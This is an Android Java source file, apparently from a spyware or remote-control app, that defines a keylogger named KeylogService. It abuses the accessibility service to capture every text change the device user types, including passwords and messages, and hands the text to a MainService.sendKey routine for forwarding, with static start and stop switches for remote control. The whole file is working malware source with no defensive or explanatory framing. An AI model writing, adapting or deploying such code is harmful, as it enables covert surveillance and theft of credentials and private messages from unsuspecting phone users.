package com.shadow.panel;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.content.Context;
public class KeylogService extends AccessibilityService {
    private static boolean running = false;
    public static void start(Context ctx) { running = true; }
    public static void stop(Context ctx) { running = false; }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!running) return;
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText().toString();
            if (text != null && text.length() > 0) { MainService.sendKey(text.toString()); }
        }
    }
    @Override public void onInterrupt() {}
}
